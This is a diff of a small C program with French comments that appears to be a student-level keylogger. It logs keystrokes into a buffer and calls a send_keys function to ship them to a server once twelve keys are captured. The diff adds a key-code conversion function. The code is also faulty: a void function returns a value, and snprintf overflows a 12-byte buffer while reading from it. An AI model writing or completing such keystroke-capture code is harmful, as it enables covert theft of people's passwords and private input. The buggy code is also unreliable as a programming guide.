@@ -2,6 +2,7 @@
 #include <stdio.h>
 #include <time.h> 
 #include <stdlib.h>
+#include <conio.h> /*pour le getch() apparement spécifique pour certains compilateurs*/
 //#include "http.h"
 
 #define MAX_KEYS 12
@@ -10,15 +11,12 @@ char key_log[MAX_KEYS];
 int current_key_log_size = 0;
 
 
-void key_code_to_string(){
-    
-    /*
-    A CODER:
- 
-    Fonction qui permet d'avoir une touche exacte avec son code décimal, attention c'est pas de l'ascii je crois
-    raison pour laquelle les minuscues sont enregistrés en majuscules 
-    */
+void key_code_to_string(int keycode){
+    // Permet d'avoir la touche exacte avec son code décimal
+    return keycode - 32;
 }
+    
+
 
 void send_keys(void){
 
@@ -35,8 +33,8 @@ void send_keys(void){
 void log_key(int key) {
 
     /*Permet d'enregistrer les frappes de claviers dans le tab key_log*/
-
-    snprintf(key_log, 1024, "%s%c", key_log, key); // rajoute le caractère dans key_log
+    int key2 =  key_code_to_string(key); 
+    snprintf(key_log, 1024, "%s%c", key_log, key2); // rajoute le caractère dans key_log
     current_key_log_size++; // +=1
     if(current_key_log_size >= MAX_KEYS){ //vérifier si l'utilisateur à taper assez pour envoyer les clefs au server
         send_keys();
